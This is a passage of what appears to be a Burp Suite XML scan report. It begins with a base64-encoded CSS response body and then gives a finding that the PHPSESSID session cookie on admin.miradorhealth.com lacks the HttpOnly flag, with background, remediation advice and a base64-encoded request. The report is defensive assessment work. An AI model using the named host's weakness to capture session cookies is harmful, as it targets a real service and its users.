BsZSAuc2VsZWN0Mi1zZWxlY3Rpb25fX2Nob2ljZV9fZGlzcGxheXtwYWRkaW5nLWxlZnQ6NXB4O3BhZGRpbmctcmlnaHQ6MnB4fS5zZWxlY3QyLWNvbnRhaW5lci0tZGVmYXVsdFtkaXI9InJ0bCJdIC5zZWxlY3QyLXNlbGVjdGlvbi0tbXVsdGlwbGUgLnNlbGVjdDItc2VsZWN0aW9uX19jaG9pY2VfX3JlbW92ZXtib3JkZXItbGVmdDoxcHggc29saWQgI2FhYTtib3JkZXItcmlnaHQ6bm9uZTtib3JkZXItdG9wLWxlZnQtcmFkaXVzOjA7Ym9yZGVyLWJvdHRvbS1sZWZ0LXJhZGl1czowO2JvcmRlci10b3AtcmlnaHQtcmFkaXVzOjRweDtib3JkZXItYm90dG9tLXJpZ2h0LXJhZGl1czo0cHh9LnNlbGVjdDItY29udGFpbmVyLS1kZWZhdWx0W2Rpcj0icnRsIl0gLnNlbGVjdDItc2VsZWN0aW9uLS1tdWx0aXBsZSAuc2VsZWN0Mi1zZWxlY3Rpb25fX2NsZWFye2Zsb2F0OmxlZnQ7bWFyZ2luLWxlZnQ6MTBweDttYXJnaW4tcmlnaHQ6YXV0b30uc2VsZWN0Mi1jb250YWluZXItLWRlZmF1bHQuc2VsZWN0Mi1jb250YWluZXItLWZvY3VzIC5zZWxlY3QyLXNlbGVjdGlvbi0tbXVsdGlwbGV7Ym9yZGVyOnNvbGlkIGJsYWNrIDFweDtvdXRsaW5lOjB9LnNlbGVjdDItY29udGFpbmVyLS1kZWZhdWx0LnNlbGVjdDItY29udGFpbmVyLS1kaXNhYmxlZCAuc2VsZWN0Mi1zZWxlY3Rpb24tLW11bHRpcGxle2JhY2tncm91bmQtY29sb3I6I2VlZTtjdXJzb3I6ZGVmYXVsdH0uc2VsZWN0Mi1jb250YWluZXItLWRlZmF1bHQuc2VsZWN0Mi1jb250YWluZXItLWRpc2FibGVkIC5zZWxlY3QyLXNlbGVjdGlvbl9fY2hvaWNlX19yZW1vdmV7ZGlzcGxheTpub25lfS5zZWxlY3QyLWNvbnRhaW5lci0tZGVmYXVsdC5zZWxlY3QyLWNvbnRhaW5lci0tb3Blbi5zZWxlY3QyLWNvbnRhaW5lci0tYWJvdmUgLnNlbGVjdDItc2VsZWN0aW9uLS1zaW5nbGUsLnNlbGVjdDItY29udGFpbmVyLS1kZWZhdWx0LnNlbGVjdDItY29udGFpbmVyLS1vcGVuLnNlbGVjdDItY29udGFpbmVyLS1hYm92ZSAuc2VsZWN0Mi1zZWxlY3Rpb24tLW11bHRpcGxle2JvcmRlci10b3AtbGVmdC1yYWRpdXM6MDtib3JkZXItdG9wLXJpZ2h0LXJhZGl1czowfS5zZWxlY3QyLWNvbnRhaW5lci0tZGVmYXVsdC5zZWxlY3QyLWNvbnRhaW5lci0tb3Blbi5zZWxlY3QyLWNvbnRhaW5lci0tYmVsb3cgLnNlbGVjdDItc2VsZWN0aW9uLS1zaW5nbGUsLnNlbGVjdDItY29udGFpbmVyLS1kZWZhdWx0LnNlbGVjdDItY29udGFpbmVyLS1vcGVuLnNlbGVjdDItY29udGFpbmVyLS1iZWxvdyAuc2VsZWN0Mi1zZWxlY3Rpb24tLW11bHRpcGxle2JvcmRlci1ib3R0b20tbGVmdC1yYWRpdXM6MDtib3JkZXItYm90dG9tLXJpZ2h0LXJhZGl1czowfS5zZWxlY3QyLWNvbnRhaW5lci0tZGVmYXVsdCAuc2VsZWN0Mi1zZWFyY2gtLWRyb3Bkb3duIC5zZWxlY3QyLXNlYXJjaF9fZmllbGR7Ym9yZGVyOjFweCBzb2xpZCAjYWFhfS5zZWxlY3QyLWNvbnRhaW5lci0tZGVmYXVsdCAuc2VsZWN0Mi1zZWFyY2gtLWlubGluZSAuc2VsZWN0Mi1zZWFyY2hfX2ZpZWxke2JhY2tncm91bmQ6dHJhbnNwYXJlbnQ7Ym9yZGVyOm5vbmU7b3V0bGluZTowO2JveC1zaGFkb3c6bm9uZTstd2Via2l0LWFwcGVhcmFuY2U6dGV4dGZpZWxkfS5zZWxlY3QyLWNvbnRhaW5lci0tZGVmYXVsdCAuc2VsZWN0Mi1yZXN1bHRzPi5zZWxlY3QyLXJlc3VsdHNfX29wdGlvbnN7bWF4LWhlaWdodDoyMDBweDtvdmVyZmxvdy15OmF1dG99LnNlbGVjdDItY29udGFpbmVyLS1kZWZhdWx0IC5zZWxlY3QyLXJlc3VsdHNfX29wdGlvbiAuc2VsZWN0Mi1yZXN1bHRzX19vcHRpb257cGFkZGluZy1sZWZ0OjFlbX0uc2VsZWN0Mi1jb250YWluZXItLWRlZmF1bHQgLnNlbGVjdDItcmVzdWx0c19fb3B0aW9uIC5zZWxlY3QyLXJlc3VsdHNfX29wdGlvbiAuc2VsZWN0Mi1yZXN1bHRzX19ncm91cHtwYWRkaW5nLWxlZnQ6MH0uc2VsZWN0Mi1jb250YWluZXItLWRlZmF1bHQgLnNlbGVjdDItcmVzdWx0c19fb3B0aW9uIC5zZWxlY3QyLXJlc3VsdHNfX29wdGlvbiAuc2VsZWN0Mi1yZXN1bHRzX19vcHRpb257bWFyZ2luLWxlZnQ6LTFlbTtwYWRkaW5nLWxlZnQ6MmVtfS5zZWxlY3QyLWNvbnRhaW5lci0tZGVmYXVsdCAuc2VsZWN0Mi1yZXN1bHRzX19vcHRpb24gLnNlbGVjdDItcmVzdWx0c19fb3B0aW9uIC5zZWxlY3QyLXJlc3VsdHNfX29wdGlvbiAuc2VsZWN0Mi1yZXN1bHRzX19vcHRpb257bWFyZ2luLWxlZnQ6LTJlbTtwYWRkaW5nLWxlZnQ6M2VtfS5zZWxlY3QyLWNvbnRhaW5lci0tZGVmYXVsdCAuc2VsZWN0Mi1yZXN1bHRzX19vcHRpb24gLnNlbGVjdDItcmVzdWx0c19fb3B0aW9uIC5zZWxlY3QyLXJlc3VsdHNfX29wdGlvbiAuc2VsZWN0Mi1yZXN1bHRzX19vcHRpb24gLnNlbGVjdDItcmVzdWx0c19fb3B0aW9ue21hcmdpbi1sZWZ0Oi0zZW07cGFkZGluZy1sZWZ0OjRlbX0uc2VsZWN0Mi1jb250YWluZXItLWRlZmF1bHQgLnNlbGVjdDItcmVzdWx0c19fb3B0aW9uIC5zZWxlY3QyLXJlc3VsdHNfX29wdGlvbiAuc2VsZWN0Mi1yZXN1bHRzX19vcHRpb24gLnNlbGVjdDItcmVzdWx0c19fb3B0aW9uIC5zZWxlY3QyLXJlc3VsdHNfX29wdGlvbiAuc2VsZWN0Mi1yZXN1bHRzX19vcHRpb257bWFyZ2luLWxlZnQ6LTRlbTtwYWRkaW5nLWxlZnQ6NWVtfS5zZWxlY3QyLWNvbnRhaW5lci0tZGVmYXVsdCAuc2VsZWN0Mi1yZXN1bHRzX19vcHRpb24gLnNlbGVjdDItcmVzdWx0c19fb3B0aW9uIC5zZWxlY3QyLXJlc3VsdHNfX29wdGlvbiAuc2VsZWN0Mi1yZXN1bHRzX19vcHRpb24gLnNlbGVjdDItcmVzdWx0c19fb3B0aW9uIC5zZWxlY3QyLXJlc3VsdHNfX29wdGlvbiAuc2VsZWN0Mi1yZXN1bHRzX19vcHRpb257bWFyZ2luLWxlZnQ6LTVlbTtwYWRkaW5nLWxlZnQ6NmVtfS5zZWxlY3QyLWNvbnRhaW5lci0tZGVmYXVsdCAuc2VsZWN0Mi1yZXN1bHRzX19vcHRpb24tLWdyb3Vwe3BhZGRpbmc6MH0uc2VsZWN0Mi1jb250YWluZXItLWRlZmF1bHQgLnNlbGVjdDItcmVzdWx0c19fb3B0aW9uLS1kaXNhYmxlZHtjb2xvcjojOTk5fS5zZWxlY3QyLWNvbnRhaW5lci0tZGVmYXVsdCAuc2VsZWN0Mi1yZXN1bHRzX19vcHRpb24tLXNlbGVjdGVke2JhY2tncm91bmQtY29sb3I6I2RkZH0uc2VsZWN0Mi1jb250YWluZXItLWRlZmF1bHQgLnNlbGVjdDItcmVzdWx0c19fb3B0aW9uLS1oaWdobGlnaHRlZC5zZWxlY3QyLXJlc3VsdHNfX29wdGlvbi0tc2VsZWN0YWJsZXtiYWNrZ3JvdW5kLWNvbG9yOiM1ODk3ZmI7Y29sb3I6d2hpdGV9LnNlbGVjdDItY29udGFpbmVyLS1kZWZhdWx0IC5zZWxlY3QyLXJlc3VsdHNfX2dyb3Vwe2N1cnNvcjpkZWZhdWx0O2Rpc3BsYXk6YmxvY2s7cGFkZGluZzo2cHh9LnNlbGVjdDItY29udGFpbmVyLS1jbGFzc2ljIC5zZWxlY3QyLXNlbGVjdGlvbi0tc2luZ2xle2JhY2tncm91bmQtY29sb3I6I2Y3ZjdmNztib3JkZXI6MXB4IHNvbGlkICNhYWE7Ym9yZGVyLXJhZGl1czo0cHg7b3V0bGluZTowO2JhY2tncm91bmQtaW1hZ2U6LXdlYmtpdC1saW5lYXItZ3JhZGllbnQodG9wLCAjZmZmIDUwJSwgI2VlZSAxMDAlKTtiYWNrZ3JvdW5kLWltYWdlOi1vLWxpbmVhci1ncmFkaWVudCh0b3AsICNmZmYgNTAlLCAjZWVlIDEwMCUpO2JhY2tncm91bmQtaW1hZ2U6bGluZWFyLWdyYWRpZW50KHRvIGJvdHRvbSwgI2ZmZiA1MCUsICNlZWUgMTAwJSk7YmFja2dyb3VuZC1yZXBlYXQ6cmVwZWF0LXg7ZmlsdGVyOnByb2dpZDpEWEltYWdlVHJhbnNmb3JtLk1pY3Jvc29mdC5ncmFkaWVudChzdGFydENvbG9yc3RyPScjRkZGRkZGRkYnLCBlbmRDb2xvcnN0cj0nI0ZGRUVFRUVFJywgR3JhZGllbnRUeXBlPTApfS5zZWxlY3QyLWNvbnRhaW5lci0tY2xhc3NpYyAuc2VsZWN0Mi1zZWxlY3Rpb24tLXNpbmdsZTpmb2N1c3tib3JkZXI6MXB4IHNvbGlkICM1ODk3ZmJ9LnNlbGVjdDItY29udGFpbmVyLS1jbGFzc2ljIC5zZWxlY3QyLXNlbGVjdGlvbi0tc2luZ2xlIC5zZWxlY3QyLXNlbGVjdGlvbl9fcmVuZGVyZWR7Y29sb3I6IzQ0NDtsaW5lLWhlaWdodDoyOHB4fS5zZWxlY3QyLWNvbnRhaW5lci0tY2xhc3NpYyAuc2VsZWN0Mi1zZWxlY3Rpb24tLXNpbmdsZSAuc2VsZWN0Mi1zZWxlY3Rpb25fX2NsZWFye2N1cnNvcjpwb2ludGVyO2Zsb2F0OnJpZ2h0O2ZvbnQtd2VpZ2h0OmJvbGQ7aGVpZ2h0OjI2cHg7bWFyZ2luLXJpZ2h0OjIwcHh9LnNlbGVjdDItY29udGFpbmVyLS1jbGFzc2ljIC5zZWxlY3QyLXNlbGVjdGlvbi0tc2luZ2xlIC5zZWxlY3QyLXNlbGVjdGlvbl9fcGxhY2Vob2xkZXJ7Y29sb3I6Izk5OX0uc2VsZWN0Mi1jb250YWluZXItLWNsYXNzaWMgLnNlbGVjdDItc2VsZWN0aW9uLS1zaW5nbGUgLnNlbGVjdDItc2VsZWN0aW9uX19hcnJvd3tiYWNrZ3JvdW5kLWNvbG9yOiNkZGQ7Ym9yZGVyOm5vbmU7Ym9yZGVyLWxlZnQ6MXB4IHNvbGlkICNhYWE7Ym9yZGVyLXRvcC1yaWdodC1yYWRpdXM6NHB4O2JvcmRlci1ib3R0b20tcmlnaHQtcmFkaXVzOjRweDtoZWlnaHQ6MjZweDtwb3NpdGlvbjphYnNvbHV0ZTt0b3A6MXB4O3JpZ2h0OjFweDt3aWR0aDoyMHB4O2JhY2tncm91bmQtaW1hZ2U6LXdlYmtpdC1saW5lYXItZ3JhZGllbnQodG9wLCAjZWVlIDUwJSwgI2NjYyAxMDAlKTtiYWNrZ3JvdW5kLWltYWdlOi1vLWxpbmVhci1ncmFkaWVudCh0b3AsICNlZWUgNTAlLCAjY2NjIDEwMCUpO2JhY2tncm91bmQtaW1hZ2U6bGluZWFyLWdyYWRpZW50KHRvIGJvdHRvbSwgI2VlZSA1MCUsICNjY2MgMTAwJSk7YmFja2dyb3VuZC1yZXBlYXQ6cmVwZWF0LXg7ZmlsdGVyOnByb2dpZDpEWEltYWdlVHJhbnNmb3JtLk1pY3Jvc29mdC5ncmFkaWVudChzdGFydENvbG9yc3RyPScjRkZFRUVFRUUnLCBlbmRDb2xvcnN0cj0nI0ZGQ0NDQ0NDJywgR3JhZGllbnRUeXBlPTApfS5zZWxlY3QyLWNvbnRhaW5lci0tY2xhc3NpYyAuc2VsZWN0Mi1zZWxlY3Rpb24tLXNpbmdsZSAuc2VsZWN0Mi1zZWxlY3Rpb25fX2Fycm93IGJ7Ym9yZGVyLWNvbG9yOiM4ODggdHJhbnNwYXJlbnQgdHJhbnNwYXJlbnQgdHJhbnNwYXJlbnQ7Ym9yZGVyLXN0eWxlOnNvbGlkO2JvcmRlci13aWR0aDo1cHggNHB4IDAgNHB4O2hlaWdodDowO2xlZnQ6NTAlO21hcmdpbi1sZWZ0Oi00cHg7bWFyZ2luLXRvcDotMnB4O3Bvc2l0aW9uOmFic29sdXRlO3RvcDo1MCU7d2lkdGg6MH0uc2VsZWN0Mi1jb250YWluZXItLWNsYXNzaWNbZGlyPSJydGwiXSAuc2VsZWN0Mi1zZWxlY3Rpb24tLXNpbmdsZSAuc2VsZWN0Mi1zZWxlY3Rpb25fX2NsZWFye2Zsb2F0OmxlZnR9LnNlbGVjdDItY29udGFpbmVyLS1jbGFzc2ljW2Rpcj0icnRsIl0gLnNlbGVjdDItc2VsZWN0aW9uLS1zaW5nbGUgLnNlbGVjdDItc2VsZWN0aW9uX19hcnJvd3tib3JkZXI6bm9uZTtib3JkZXItcmlnaHQ6MXB4IHNvbGlkICNhYWE7Ym9yZGVyLXJhZGl1czowO2JvcmRlci10b3AtbGVmdC1yYWRpdXM6NHB4O2JvcmRlci1ib3R0b20tbGVmdC1yYWRpdXM6NHB4O2xlZnQ6MXB4O3JpZ2h0OmF1dG99LnNlbGVjdDItY29udGFpbmVyLS1jbGFzc2ljLnNlbGVjdDItY29udGFpbmVyLS1vcGVuIC5zZWxlY3QyLXNlbGVjdGlvbi0tc2luZ2xle2JvcmRlcjoxcHggc29saWQgIzU4OTdmYn0uc2VsZWN0Mi1jb250YWluZXItLWNsYXNzaWMuc2VsZWN0Mi1jb250YWluZXItLW9wZW4gLnNlbGVjdDItc2VsZWN0aW9uLS1zaW5nbGUgLnNlbGVjdDItc2VsZWN0aW9uX19hcnJvd3tiYWNrZ3JvdW5kOnRyYW5zcGFyZW50O2JvcmRlcjpub25lfS5zZWxlY3QyLWNvbnRhaW5lci0tY2xhc3NpYy5zZWxlY3QyLWNvbnRhaW5lci0tb3BlbiAuc2VsZWN0Mi1zZWxlY3Rpb24tLXNpbmdsZSAuc2VsZWN0Mi1zZWxlY3Rpb25fX2Fycm93IGJ7Ym9yZGVyLWNvbG9yOnRyYW5zcGFyZW50IHRyYW5zcGFyZW50ICM4ODggdHJhbnNwYXJlbnQ7Ym9yZGVyLXdpZHRoOjAgNHB4IDVweCA0cHh9LnNlbGVjdDItY29udGFpbmVyLS1jbGFzc2ljLnNlbGVjdDItY29udGFpbmVyLS1vcGVuLnNlbGVjdDItY29udGFpbmVyLS1hYm92ZSAuc2VsZWN0Mi1zZWxlY3Rpb24tLXNpbmdsZXtib3JkZXItdG9wOm5vbmU7Ym9yZGVyLXRvcC1sZWZ0LXJhZGl1czowO2JvcmRlci10b3AtcmlnaHQtcmFkaXVzOjA7YmFja2dyb3VuZC1pbWFnZTotd2Via2l0LWxpbmVhci1ncmFkaWVudCh0b3AsICNmZmYgMCUsICNlZWUgNTAlKTtiYWNrZ3JvdW5kLWltYWdlOi1vLWxpbmVhci1ncmFkaWVudCh0b3AsICNmZmYgMCUsICNlZWUgNTAlKTtiYWNrZ3JvdW5kLWltYWdlOmxpbmVhci1ncmFkaWVudCh0byBib3R0b20sICNmZmYgMCUsICNlZWUgNTAlKTtiYWNrZ3JvdW5kLXJlcGVhdDpyZXBlYXQteDtmaWx0ZXI6cHJvZ2lkOkRYSW1hZ2VUcmFuc2Zvcm0uTWljcm9zb2Z0LmdyYWRpZW50KHN0YXJ0Q29sb3JzdHI9JyNGRkZGRkZGRicsIGVuZENvbG9yc3RyPScjRkZFRUVFRUUnLCBHcmFkaWVudFR5cGU9MCl9LnNlbGVjdDItY29udGFpbmVyLS1jbGFzc2ljLnNlbGVjdDItY29udGFpbmVyLS1vcGVuLnNlbGVjdDItY29udGFpbmVyLS1iZWxvdyAuc2VsZWN0Mi1zZWxlY3Rpb24tLXNpbmdsZXtib3JkZXItYm90dG9tOm5vbmU7Ym9yZGVyLWJvdHRvbS1sZWZ0LXJhZGl1czowO2JvcmRlci1ib3R0b20tcmlnaHQtcmFkaXVzOjA7YmFja2dyb3VuZC1pbWFnZTotd2Via2l0LWxpbmVhci1ncmFkaWVudCh0b3AsICNlZWUgNTAlLCAjZmZmIDEwMCUpO2JhY2tncm91bmQtaW1hZ2U6LW8tbGluZWFyLWdyYWRpZW50KHRvcCwgI2VlZSA1MCUsICNmZmYgMTAwJSk7YmFja2dyb3VuZC1pbWFnZTpsaW5lYXItZ3JhZGllbnQodG8gYm90dG9tLCAjZWVlIDUwJSwgI2ZmZiAxMDAlKTtiYWNrZ3JvdW5kLXJlcGVhdDpyZXBlYXQteDtmaWx0ZXI6cHJvZ2lkOkRYSW1hZ2VUcmFuc2Zvcm0uTWljcm9zb2Z0LmdyYWRpZW50KHN0YXJ0Q29sb3JzdHI9JyNGRkVFRUVFRScsIGVuZENvbG9yc3RyPScjRkZGRkZGRkYnLCBHcmFkaWVudFR5cGU9MCl9LnNlbGVjdDItY29udGFpbmVyLS1jbGFzc2ljIC5zZWxlY3QyLXNlbGVjdGlvbi0tbXVsdGlwbGV7YmFja2dyb3VuZC1jb2xvcjp3aGl0ZTtib3JkZXI6MXB4IHNvbGlkICNhYWE7Ym9yZGVyLXJhZGl1czo0cHg7Y3Vyc29yOnRleHQ7b3V0bGluZTowO3BhZGRpbmctYm90dG9tOjVweDtwYWRkaW5nLXJpZ2h0OjVweH0uc2VsZWN0Mi1jb250YWluZXItLWNsYXNzaWMgLnNlbGVjdDItc2VsZWN0aW9uLS1tdWx0aXBsZTpmb2N1c3tib3JkZXI6MXB4IHNvbGlkICM1ODk3ZmJ9LnNlbGVjdDItY29udGFpbmVyLS1jbGFzc2ljIC5zZWxlY3QyLXNlbGVjdGlvbi0tbXVsdGlwbGUgLnNlbGVjdDItc2VsZWN0aW9uX19jbGVhcntkaXNwbGF5Om5vbmV9LnNlbGVjdDItY29udGFpbmVyLS1jbGFzc2ljIC5zZWxlY3QyLXNlbGVjdGlvbi0tbXVsdGlwbGUgLnNlbGVjdDItc2VsZWN0aW9uX19jaG9pY2V7YmFja2dyb3VuZC1jb2xvcjojZTRlNGU0O2JvcmRlcjoxcHggc29saWQgI2FhYTtib3JkZXItcmFkaXVzOjRweDtkaXNwbGF5OmlubGluZS1ibG9jazttYXJnaW4tbGVmdDo1cHg7bWFyZ2luLXRvcDo1cHg7cGFkZGluZzowfS5zZWxlY3QyLWNvbnRhaW5lci0tY2xhc3NpYyAuc2VsZWN0Mi1zZWxlY3Rpb24tLW11bHRpcGxlIC5zZWxlY3QyLXNlbGVjdGlvbl9fY2hvaWNlX19kaXNwbGF5e2N1cnNvcjpkZWZhdWx0O3BhZGRpbmctbGVmdDoycHg7cGFkZGluZy1yaWdodDo1cHh9LnNlbGVjdDItY29udGFpbmVyLS1jbGFzc2ljIC5zZWxlY3QyLXNlbGVjdGlvbi0tbXVsdGlwbGUgLnNlbGVjdDItc2VsZWN0aW9uX19jaG9pY2VfX3JlbW92ZXtiYWNrZ3JvdW5kLWNvbG9yOnRyYW5zcGFyZW50O2JvcmRlcjpub25lO2JvcmRlci10b3AtbGVmdC1yYWRpdXM6NHB4O2JvcmRlci1ib3R0b20tbGVmdC1yYWRpdXM6NHB4O2NvbG9yOiM4ODg7Y3Vyc29yOnBvaW50ZXI7Zm9udC1zaXplOjFlbTtmb250LXdlaWdodDpib2xkO3BhZGRpbmc6MCA0cHh9LnNlbGVjdDItY29udGFpbmVyLS1jbGFzc2ljIC5zZWxlY3QyLXNlbGVjdGlvbi0tbXVsdGlwbGUgLnNlbGVjdDItc2VsZWN0aW9uX19jaG9pY2VfX3JlbW92ZTpob3Zlcntjb2xvcjojNTU1O291dGxpbmU6bm9uZX0uc2VsZWN0Mi1jb250YWluZXItLWNsYXNzaWNbZGlyPSJydGwiXSAuc2VsZWN0Mi1zZWxlY3Rpb24tLW11bHRpcGxlIC5zZWxlY3QyLXNlbGVjdGlvbl9fY2hvaWNle21hcmdpbi1sZWZ0OjVweDttYXJnaW4tcmlnaHQ6YXV0b30uc2VsZWN0Mi1jb250YWluZXItLWNsYXNzaWNbZGlyPSJydGwiXSAuc2VsZWN0Mi1zZWxlY3Rpb24tLW11bHRpcGxlIC5zZWxlY3QyLXNlbGVjdGlvbl9fY2hvaWNlX19kaXNwbGF5e3BhZGRpbmctbGVmdDo1cHg7cGFkZGluZy1yaWdodDoycHh9LnNlbGVjdDItY29udGFpbmVyLS1jbGFzc2ljW2Rpcj0icnRsIl0gLnNlbGVjdDItc2VsZWN0aW9uLS1tdWx0aXBsZSAuc2VsZWN0Mi1zZWxlY3Rpb25fX2Nob2ljZV9fcmVtb3Zle2JvcmRlci10b3AtbGVmdC1yYWRpdXM6MDtib3JkZXItYm90dG9tLWxlZnQtcmFkaXVzOjA7Ym9yZGVyLXRvcC1yaWdodC1yYWRpdXM6NHB4O2JvcmRlci1ib3R0b20tcmlnaHQtcmFkaXVzOjRweH0uc2VsZWN0Mi1jb250YWluZXItLWNsYXNzaWMuc2VsZWN0Mi1jb250YWluZXItLW9wZW4gLnNlbGVjdDItc2VsZWN0aW9uLS1tdWx0aXBsZXtib3JkZXI6MXB4IHNvbGlkICM1ODk3ZmJ9LnNlbGVjdDItY29udGFpbmVyLS1jbGFzc2ljLnNlbGVjdDItY29udGFpbmVyLS1vcGVuLnNlbGVjdDItY29udGFpbmVyLS1hYm92ZSAuc2VsZWN0Mi1zZWxlY3Rpb24tLW11bHRpcGxle2JvcmRlci10b3A6bm9uZTtib3JkZXItdG9wLWxlZnQtcmFkaXVzOjA7Ym9yZGVyLXRvcC1yaWdodC1yYWRpdXM6MH0uc2VsZWN0Mi1jb250YWluZXItLWNsYXNzaWMuc2VsZWN0Mi1jb250YWluZXItLW9wZW4uc2VsZWN0Mi1jb250YWluZXItLWJlbG93IC5zZWxlY3QyLXNlbGVjdGlvbi0tbXVsdGlwbGV7Ym9yZGVyLWJvdHRvbTpub25lO2JvcmRlci1ib3R0b20tbGVmdC1yYWRpdXM6MDtib3JkZXItYm90dG9tLXJpZ2h0LXJhZGl1czowfS5zZWxlY3QyLWNvbnRhaW5lci0tY2xhc3NpYyAuc2VsZWN0Mi1zZWFyY2gtLWRyb3Bkb3duIC5zZWxlY3QyLXNlYXJjaF9fZmllbGR7Ym9yZGVyOjFweCBzb2xpZCAjYWFhO291dGxpbmU6MH0uc2VsZWN0Mi1jb250YWluZXItLWNsYXNzaWMgLnNlbGVjdDItc2VhcmNoLS1pbmxpbmUgLnNlbGVjdDItc2VhcmNoX19maWVsZHtvdXRsaW5lOjA7Ym94LXNoYWRvdzpub25lfS5zZWxlY3QyLWNvbnRhaW5lci0tY2xhc3NpYyAuc2VsZWN0Mi1kcm9wZG93bntiYWNrZ3JvdW5kLWNvbG9yOiNmZmY7Ym9yZGVyOjFweCBzb2xpZCB0cmFuc3BhcmVudH0uc2VsZWN0Mi1jb250YWluZXItLWNsYXNzaWMgLnNlbGVjdDItZHJvcGRvd24tLWFib3Zle2JvcmRlci1ib3R0b206bm9uZX0uc2VsZWN0Mi1jb250YWluZXItLWNsYXNzaWMgLnNlbGVjdDItZHJvcGRvd24tLWJlbG93e2JvcmRlci10b3A6bm9uZX0uc2VsZWN0Mi1jb250YWluZXItLWNsYXNzaWMgLnNlbGVjdDItcmVzdWx0cz4uc2VsZWN0Mi1yZXN1bHRzX19vcHRpb25ze21heC1oZWlnaHQ6MjAwcHg7b3ZlcmZsb3cteTphdXRvfS5zZWxlY3QyLWNvbnRhaW5lci0tY2xhc3NpYyAuc2VsZWN0Mi1yZXN1bHRzX19vcHRpb24tLWdyb3Vwe3BhZGRpbmc6MH0uc2VsZWN0Mi1jb250YWluZXItLWNsYXNzaWMgLnNlbGVjdDItcmVzdWx0c19fb3B0aW9uLS1kaXNhYmxlZHtjb2xvcjpncmV5fS5zZWxlY3QyLWNvbnRhaW5lci0tY2xhc3NpYyAuc2VsZWN0Mi1yZXN1bHRzX19vcHRpb24tLWhpZ2hsaWdodGVkLnNlbGVjdDItcmVzdWx0c19fb3B0aW9uLS1zZWxlY3RhYmxle2JhY2tncm91bmQtY29sb3I6IzM4NzVkNztjb2xvcjojZmZmfS5zZWxlY3QyLWNvbnRhaW5lci0tY2xhc3NpYyAuc2VsZWN0Mi1yZXN1bHRzX19ncm91cHtjdXJzb3I6ZGVmYXVsdDtkaXNwbGF5OmJsb2NrO3BhZGRpbmc6NnB4fS5zZWxlY3QyLWNvbnRhaW5lci0tY2xhc3NpYy5zZWxlY3QyLWNvbnRhaW5lci0tb3BlbiAuc2VsZWN0Mi1kcm9wZG93bntib3JkZXItY29sb3I6IzU4OTdmYn0K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2816601808014751744</serialNumber>
    <type>5244416</type>
    <name><![CDATA[Cookie without HttpOnly flag set]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/]]></path>
    <location><![CDATA[/]]></location>
    <severity>Low</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If the HttpOnly attribute is set on a cookie, then the cookie's value cannot be read or set by client-side JavaScript. This measure makes certain client-side attacks, such as cross-site scripting, slightly harder to exploit by preventing them from trivially capturing the cookie's value via an injected script.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>There is usually no good reason not to set the HttpOnly flag on all cookies. Unless you specifically require legitimate client-side scripts within your application to read or set a cookie's value, you should set the HttpOnly flag by including this attribute within the relevant Set-cookie directive.</p>
<p>You should be aware that the restrictions imposed by the HttpOnly flag can potentially be circumvented in some circumstances, and that numerous other serious attacks can be delivered by client-side script injection, aside from simple cookie stealing. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/cross-site-scripting/exploiting">Web Security Academy: Exploiting XSS vulnerabilities</a></li><li><a href="https://portswigger.net/research/web-storage-the-lesser-evil-for-session-tokens#httponly">HttpOnly effectiveness</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li><li><a href="https://capec.mitre.org/data/definitions/31.html">CAPEC-31: Accessing/Intercepting/Modifying HTTP Cookies</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The following cookie was issued by the application and does not have the HttpOnly flag set:<ul><li><b>PHPSESSID</b></li></ul>The cookie appears to contain a session token, which may increase the risk associated with this issue. You should review the contents of the cookie to determine its function.]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[Session: PHPSESSID]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpTZWMtQ2gtVWE6ICJDaHJvbWl1bSI7dj0iMTMxIiwgIk5vdF9BIEJyYW5kIjt2PSIyNCINClNlYy1DaC1VYS1Nb2JpbGU6ID8wDQpTZWMtQ2gtVWEtUGxhdGZvcm06ICJMaW51eCINCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjkNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43DQpTZWMtRmV0Y2gtU2l0ZTogbm9uZQ0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtVXNlcjogPzENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KUHJpb3JpdHk6IHU9MCwgaQ0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KDQo=]]></request>
